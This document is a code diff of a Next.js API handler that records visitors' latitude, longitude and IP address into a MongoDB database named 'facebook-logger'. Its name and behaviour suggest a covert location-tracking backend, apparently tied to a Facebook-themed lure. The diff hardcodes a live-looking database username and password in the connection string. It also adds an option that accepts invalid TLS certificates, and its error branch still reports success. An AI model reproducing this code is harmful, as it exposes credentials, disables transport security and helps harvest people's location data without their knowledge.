@@ -1,14 +1,25 @@
 import { NextApiRequest, NextApiResponse } from 'next';
 import { MongoClient } from 'mongodb';
 
-const uri = "mongodb+srv://edgarafedo123:5SirfCPTfHWXyCMq@serverlessinstance0.ntmdhhx.mongodb.net/";
+const uri = "mongodb+srv://edgarafedo123:5SirfCPTfHWXyCMq@serverlessinstance0.ntmdhhx.mongodb.net/?retryWrites=true&w=majority&tls=true";
 
 export default async function handler(req: NextApiRequest, res: NextApiResponse) {
   if (req.method !== 'POST') {
     return res.status(405).json({ message: 'Método no permitido' });
   }
 
+  const client = new MongoClient(uri, {
+    ssl: true,
+    tls: true,
+    tlsAllowInvalidCertificates: true
+  });
+
   try {
+    await client.connect();
+    
+    const database = client.db('facebook-logger');
+    const collection = database.collection('locations');
+    
     const { lat, lng } = req.body;
     
     const logData = {
@@ -27,18 +38,13 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
       ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress
     };
 
-    const client = new MongoClient(uri);
-    await client.connect();
-    
-    const database = client.db('facebook-logger');
-    const collection = database.collection('locations');
-    
     await collection.insertOne(logData);
-    await client.close();
 
     res.status(200).json({ success: true });
   } catch (error) {
     console.error('Error:', error);
     res.status(200).json({ success: true });
+  } finally {
+    await client.close();
   }
 } 
